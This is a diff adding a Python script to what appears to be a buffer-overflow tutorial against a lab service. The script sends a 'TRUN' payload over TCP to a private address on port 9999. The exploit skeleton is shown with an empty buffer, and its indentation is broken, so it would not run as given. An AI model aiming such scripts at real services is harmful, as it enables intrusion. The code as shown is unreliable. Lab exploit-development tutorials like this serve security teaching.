@@ -10,3 +10,24 @@
 
 - Now we can copy this output and modify the script we used in fuzzing to these :
 
+```python
+#!/usr/bin/python
+ 
+import sys, socket
+from time import sleep
+ 
+buffer = ""
+
+    try:
+        payload = "TRUN /.:/" + buffer
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.35',9999))
+        print ("[+] Sending the payload...\n" + str(len(buffer)))
+        s.send((payload.encode()))
+        s.close()
+
+    except:
+        print ("Error Connecting to the server")
+        sys.exit()
+```
